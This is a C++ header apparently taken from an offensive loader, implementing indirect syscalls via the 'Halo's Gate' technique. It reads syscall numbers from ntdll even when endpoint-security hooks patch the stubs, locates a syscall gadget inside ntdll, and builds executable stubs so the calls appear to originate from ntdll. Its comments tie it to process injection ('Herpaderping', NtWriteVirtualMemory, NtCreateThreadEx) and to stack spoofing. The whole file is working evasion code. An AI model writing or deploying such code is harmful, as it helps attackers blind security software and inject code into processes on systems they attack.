#pragma once
#include <Windows.h>
#include "api_hash.h"

// B2 — Indirect Syscalls (Halo's Gate) — T1106 enhancement
//
// Problem: RESOLVE_API returns the ntdll stub address; if an EDR placed a JMP hook
// at the stub prologue, the hook fires even though StackSpoofer hides our call origin.
//
// Solution:
//  1. Read SSN (System Service Number) from the stub bytes directly.
//     If the stub is patched (first bytes overwritten), infer SSN from clean neighbors
//     in the EAT (Halo's Gate technique).
//  2. Find a "syscall; ret" gadget (0F 05 C3) in ntdll .text — so the actual syscall
//     instruction executes from within ntdll's address space, not from our PE.
//  3. Build a minimal stub on a VirtualAlloc'd RX page:
//         mov r10, rcx        ; Windows syscall ABI: arg1 must be in r10 at kernel entry
//         mov eax, <SSN>      ; syscall number
//         mov r11, <gadget>   ; absolute address of syscall;ret inside ntdll
//         jmp r11             ; transfer to ntdll — EDR sees syscall origin as ntdll
//
// Stub byte layout (21 bytes):
//   49 89 CA             3  mov r10, rcx
//   B8 XX XX XX XX       5  mov eax, <SSN>
//   49 BB XX..XX        10  movabs r11, <gadget_addr>
//   41 FF E3             3  jmp r11
//
// Only the 5 injection-critical APIs are replaced:
//   NtCreateSection, NtCreateProcessEx, NtAllocateVirtualMemory,
//   NtWriteVirtualMemory, NtCreateThreadEx

#define SYSCALL_STUB_SIZE  21
#define SYSCALL_MAX_STUBS   8

static BYTE*  g_SyscallPool     = nullptr;
static int    g_SyscallPoolUsed = 0;
static PVOID  g_SyscallGadget   = nullptr;

// ---------------------------------------------------------------------------
// SSN Resolution
// ---------------------------------------------------------------------------

// Read SSN from a standard (unhooked) ntdll stub:
//   4C 8B D1       mov r10, rcx
//   B8 ?? ?? ?? ?? mov eax, <SSN>   ← SSN is at offset +4
static inline DWORD ReadSsnDirect(PBYTE stub) {
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8)
        return *(DWORD*)(stub + 4);
    return (DWORD)-1;
}

// Halo's Gate: resolve SSN for the function identified by targetHash.
// If the target stub is patched, scan ±N EAT neighbors for a clean stub and infer.
// Precondition: hNtdll is a valid ntdll base address.
static inline DWORD GetSsnHalosGate(HMODULE hNtdll, DWORD targetHash) {
    PBYTE base = (PBYTE)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords  = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);

    // Find the index of the target function in the names table
    int targetIdx = -1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (Djb2Hash((const char*)(base + names[i])) == targetHash) {
            targetIdx = (int)i;
            break;
        }
    }
    if (targetIdx < 0) return (DWORD)-1;

    // Try direct SSN read from the stub
    DWORD ssn = ReadSsnDirect(base + funcs[ords[targetIdx]]);
    if (ssn != (DWORD)-1) return ssn;

    // Stub is hooked — walk neighbors to infer SSN
    // ntdll syscall stubs are ordered by SSN: stub[i] has SSN N, stub[i+1] has SSN N+1
    for (int d = 1; d <= 16; d++) {
        if (targetIdx + d < (int)exp->NumberOfNames) {
            DWORD n = ReadSsnDirect(base + funcs[ords[targetIdx + d]]);
            if (n != (DWORD)-1) return n - (DWORD)d;
        }
        if (targetIdx - d >= 0) {
            DWORD n = ReadSsnDirect(base + funcs[ords[targetIdx - d]]);
            if (n != (DWORD)-1) return n + (DWORD)d;
        }
    }
    return (DWORD)-1;
}

// ---------------------------------------------------------------------------
// Gadget Finder
// ---------------------------------------------------------------------------

// Scan ntdll .text for the first "syscall; ret" sequence (0F 05 C3).
// This address is used as the jump target in each stub so the kernel sees
// the syscall originating from within ntdll.
static inline PVOID FindSyscallGadget(HMODULE hNtdll) {
    PBYTE base = (PBYTE)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        PBYTE text = base + sec->VirtualAddress;
        DWORD sz   = sec->Misc.VirtualSize;
        for (DWORD j = 0; j + 2 < sz; j++) {
            if (text[j] == 0x0F && text[j+1] == 0x05 && text[j+2] == 0xC3)
                return text + j;
        }
    }
    return nullptr;
}

// ---------------------------------------------------------------------------
// Stub Pool Management
// ---------------------------------------------------------------------------

// Allocate the stub pool page (RW initially; sealed to RX after all stubs written).
// Must be called before any BuildIndirectStub() calls.
static inline bool InitSyscallPool(HMODULE hNtdll) {
    g_SyscallGadget = FindSyscallGadget(hNtdll);
    if (!g_SyscallGadget) return false;

    g_SyscallPool = (BYTE*)VirtualAlloc(
        nullptr,
        SYSCALL_STUB_SIZE * SYSCALL_MAX_STUBS,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    return g_SyscallPool != nullptr;
}

// Write one stub into the pool; returns a callable function pointer.
// ssn == (DWORD)-1 or gadget == nullptr → returns nullptr (caller checks).
static inline PVOID BuildIndirectStub(DWORD ssn) {
    if (!g_SyscallPool || !g_SyscallGadget) return nullptr;
    if (ssn == (DWORD)-1) return nullptr;
    if (g_SyscallPoolUsed >= SYSCALL_MAX_STUBS) return nullptr;

    BYTE* s = g_SyscallPool + g_SyscallPoolUsed * SYSCALL_STUB_SIZE;

    s[0] = 0x49; s[1] = 0x89; s[2] = 0xCA;          // mov r10, rcx
    s[3] = 0xB8;                                       // mov eax,
    memcpy(s + 4, &ssn, 4);                           //   <SSN>
    s[8] = 0x49; s[9] = 0xBB;                         // movabs r11,
    ULONG_PTR gadgetAddr = (ULONG_PTR)g_SyscallGadget;
    memcpy(s + 10, &gadgetAddr, 8);                   //   <gadget_addr>
    s[18] = 0x41; s[19] = 0xFF; s[20] = 0xE3;        // jmp r11

    g_SyscallPoolUsed++;
    return s;
}

// Flip the pool to PAGE_EXECUTE_READ — no persistent RWX page after this call.
static inline void SealSyscallPool() {
    if (!g_SyscallPool) return;
    DWORD old;
    VirtualProtect(g_SyscallPool,
        SYSCALL_STUB_SIZE * SYSCALL_MAX_STUBS,
        PAGE_EXECUTE_READ, &old);
}

// ---------------------------------------------------------------------------
// Convenience macro
// ---------------------------------------------------------------------------

// Usage inside Herpaderping() after InitSyscallPool(hNtdll):
//   INDIRECT_SYSCALL(_NtCreateSection, pNtCreateSection, NtCreateSection);
#define INDIRECT_SYSCALL(fnType, var, hashConst) \
    fnType var = (fnType)BuildIndirectStub(GetSsnHalosGate(hNtdll, ApiHash::hashConst))
